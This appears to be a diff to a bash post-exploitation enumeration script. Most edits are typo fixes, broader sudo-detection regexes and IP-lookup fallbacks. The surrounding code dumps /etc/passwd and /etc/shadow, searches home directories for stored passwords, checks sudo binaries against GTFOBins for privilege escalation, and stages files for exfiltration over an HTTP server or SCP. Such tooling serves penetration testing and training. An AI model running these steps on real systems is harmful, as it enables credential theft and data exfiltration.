@@ -1,12 +1,12 @@
 #!/bin/bash
 
 # ========== Colors ==========
-CYAN=$'\033[0;36m' # Used for interactive segements
+CYAN=$'\033[0;36m' # Used for interactive segments
 RED=$'\033[0;31m' # Errors and warnings
-GREEN=$'\033[0;32m' # Positive notifcations
+GREEN=$'\033[0;32m' # Positive notifications
 WHITE=$'\033[0;37m' # Displayed information headers
 YELLOW=$'\033[1;33m' # Things of interest
-DEF=$'\033[0m' # Defualt color, returns to system settings
+DEF=$'\033[0m' # Default color, returns to system settings
 
 # ========== Globals ==========
 dest=""
@@ -22,7 +22,7 @@ do_basic_info() {
     echo -e "${WHITE}Hostname:${DEF} $(hostname)"
     echo -e "${WHITE}Groups:${DEF} $(id)"
     echo -e "${WHITE}PATH:${DEF} $PATH"
-    echo -e "${WHITE}IP addresses:${DEF} $(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep -v '^127\.')"
+    echo -e "${WHITE}IP addresses:${DEF} $(ip -4 -o addr show 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | grep -v '^127\.' || ifconfig 2>/dev/null | grep 'inet ' | awk '{print $2}' | grep -v '^127\.')"
 }
 
 do_basic_enum() {
@@ -36,14 +36,13 @@ do_basic_enum() {
                 SUDO_OUTPUT=$(sudo -l 2>/dev/null)
                 echo "$SUDO_OUTPUT"
                 # Dumping /etc/shadow and /etc/passwd to their own files
-                if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
+                if echo "$SUDO_OUTPUT" | grep -qE "\(ALL\s*:\s*ALL\)|\(ALL\)\s*ALL"; then
                     echo -e "${GREEN}Full sudo access detected. Dumping /etc/passwd, /etc/shadow, sudoers, and root SSH keys...${DEF}"
                     sleep 2
-                    
-                [[ -n "$COLLECT_DIR" ]] && {
-                    sudo cat /etc/passwd | tee "$COLLECT_DIR/passwd.txt" > /dev/null 
-                    sudo cat /etc/shadow | tee "$COLLECT_DIR/shadow.txt" > /dev/null
-                }
+                    [[ -n "$COLLECT_DIR" ]] && {
+                        sudo cat /etc/passwd | tee "$COLLECT_DIR/passwd.txt" > /dev/null
+                        sudo cat /etc/shadow | tee "$COLLECT_DIR/shadow.txt" > /dev/null
+                    }
                 fi
 
                 echo -e "\n${WHITE}Operating System:${DEF}"
@@ -52,6 +51,13 @@ do_basic_enum() {
                 uname -a
                 echo -e "\n${WHITE}CPU Information:${DEF}"
                 lscpu | grep -E '^Architecture:|^CPU\(s\):'
+
+                # Ensure the collected files are accessible for exfil
+                if [[ -n "$COLLECT_DIR" ]]; then
+                    sudo chown -R "$(whoami):$(whoami)" "$COLLECT_DIR"
+                    chmod -R 644 "$COLLECT_DIR"/* 2>/dev/null
+                    chmod -R 755 "$COLLECT_DIR"/*/ 2>/dev/null
+                fi
                 break
                 ;;
 
@@ -65,11 +71,6 @@ do_basic_enum() {
                 ;;
         esac
     done
-
-# Ensure the collected files are accessible for exfil
-sudo chown -R "$(whoami):$(whoami)" "$COLLECT_DIR"
-chmod -R 644 "$COLLECT_DIR"/* 2>/dev/null
-chmod -R 755 "$COLLECT_DIR"/*/ 2>/dev/null
 }
 
 function check_sudo_gtfobins { # searches either a copy of gtfobins binaries or tries to curl gtfobins
@@ -89,7 +90,7 @@ function check_sudo_gtfobins { # searches either a copy of gtfobins binaries or 
         local_only=true
     fi
 
-    if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
+    if ! echo "$SUDO_OUTPUT" | grep -qE "\(ALL\s*:\s*ALL\)|\(ALL\)\s*ALL"; then
         echo -e "\n${CYAN}========= GTFOBins Check ==========${DEF}\n"
         echo "$SUDO_OUTPUT" | sed -nE 's/^.*NOPASSWD: (.+)/\1/p' | tr ',' '\n' | xargs -n1 basename | sort -u | while read -r bin; do
             echo -e "${WHITE}Checking GTFOBins for: $bin${DEF}"
@@ -116,7 +117,7 @@ do_lhf_enum() { # searches for the word "password=", backup files, binaries with
         case "$answer2" in
             [Yy]*)
                 echo -e "\n${CYAN}========= LOW-HANGING FRUIT ==========${DEF}\n"
-                if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
+                if echo "$SUDO_OUTPUT" | grep -qE "\(ALL\s*:\s*ALL\)|\(ALL\)\s*ALL"; then
                     echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}" #
                     sudo grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null
                 else 
@@ -157,12 +158,13 @@ exfil_menu() { # gives the user 2 options of exfiltration, either a http server 
         read -rp "${CYAN}Enter your choice (1-3): ${DEF}" exfil_choice
         case "$exfil_choice" in
             1)
-                tgt_ip=$(ip route get 1 | awk '{print $7; exit}')
+                tgt_ip=$(ip route get 1 2>/dev/null | awk '{print $7; exit}' || hostname -I 2>/dev/null | awk '{print $1}')
                 echo -e "${GREEN}Starting Python3 HTTP server on port 8080...${DEF}"
                 the_end
                 echo -e "${WHITE}Download with: wget http://$tgt_ip:8080/${dest2}${DEF}"
                 cd "$COLLECT_DIR" || exit
                 python3 -m http.server 8080
+                break
                 ;;
             2)
                 echo -e "${WHITE}SCP Push: Directory will be sent to your home directory.${DEF}"
@@ -230,7 +232,7 @@ while true; do
         [Yy]*)
             read -rp "${CYAN}Enter filename (e.g., output.txt): ${DEF}" filename
             COLLECT_DIR="$HOME/enum-dump" 
-            mkdir -p "$COLLECT_DIR" # creates directory called "enum_dump"
+            mkdir -p "$COLLECT_DIR" # creates directory called "enum-dump"
             dest="$COLLECT_DIR/$filename"
             dest2="$filename"
             tempfile=$(mktemp)
@@ -259,7 +261,7 @@ echo
 do_basic_enum
 sleep 1
 echo
-if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then # only executes the check_sudo_gtfobins if the user does not have full rights
+if ! echo "$SUDO_OUTPUT" | grep -qE "\(ALL\s*:\s*ALL\)|\(ALL\)\s*ALL"; then # only executes the check_sudo_gtfobins if the user does not have full rights
     check_sudo_gtfobins                                
 else 
      echo -e "${GREEN}Full sudo access detected — skipping GTFOBins lookup.${DEF}"
